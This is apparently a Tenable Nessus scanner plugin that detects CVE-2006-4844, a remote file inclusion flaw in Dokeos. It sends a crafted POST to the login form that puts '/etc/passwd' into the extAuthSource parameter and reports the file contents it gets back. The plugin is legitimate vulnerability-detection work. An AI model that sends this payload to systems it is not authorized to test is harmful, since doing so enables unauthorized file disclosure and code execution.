#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(22366);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-4844");
  script_bugtraq_id(20056);
  script_xref(name:"OSVDB", value:"28827");

  script_name(english:"Dokeos claro_init_local.inc.php extAuthSource Parameter Array Remote File Inclusion");
  script_summary(english:"Tries to read a local file with Dokeos");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file inclusion attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Dokeos, an open-source, e-learning and
course management web application written in PHP. 

The version of Dokeos installed on the remote host fails to sanitize
input to the 'extAuthSource' parameter array before using it to
include PHP code in the 'claroline/inc/claro_init_local.inc.php'
script.  Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this issue to view
arbitrary files on the remote host or to execute arbitrary PHP code,
possibly taken from third-party hosts. 

Note that, while the vulnerability exists in Claroline itself, Dokeos
is affected as well because it includes a vulnerable version of
Claroline." );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00112-09142006" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/dokeos", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the script exists.
  url = string(dir, "/index.php");
  r = http_get_cache(item:url, port:port);
  if (isnull(r)) exit(0);

  # If...
  if (
    # it looks like Dokeos and...
    (
      'alt="Dokeos logo"' >< r ||
      'img src="./home/large_dokeos_logo.gif"' >< r
    ) &&
    # it looks like the login form
    egrep(pattern:'<input [^>]*name="login"', string:r)
  )
  {
    # Try to exploit the flaw to read a file.
    file = "/etc/passwd";
    login = string(SCRIPT_NAME, "-", unixtime());  # must not exist
    postdata = string(
      "login=", login, "&",
      "password=nessus&",
      "submitAuth=Enter&",
      "extAuthSource[nessus][newUser]=", file
    );
    r = http_send_recv3(port:port, method: "POST", item: url, version: 11, data: postdata,
      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
    if (isnull(r)) exit(0);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:r[2]) ||
      # we get an error claiming the file doesn't exist or...
      string("main(", file, "): failed to open stream: No such file") >< r[2] ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< r[2]
    )
    {
      if (egrep(string:r[2], pattern:"root:.*:0:[01]:"))
      {
        contents = r[2] - strstr(r[2], "<br");
        if (contents) contents = contents - strstr(contents, "<!DOCTYPE");
      }

      if (contents && report_verbosity)
      {
        report = string(
          "\n",
          "Here are the contents of the file '/etc/passwd' that Nessus was\n",
          "able to read from the remote host :\n",
          "\n",
          contents
        );
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
}
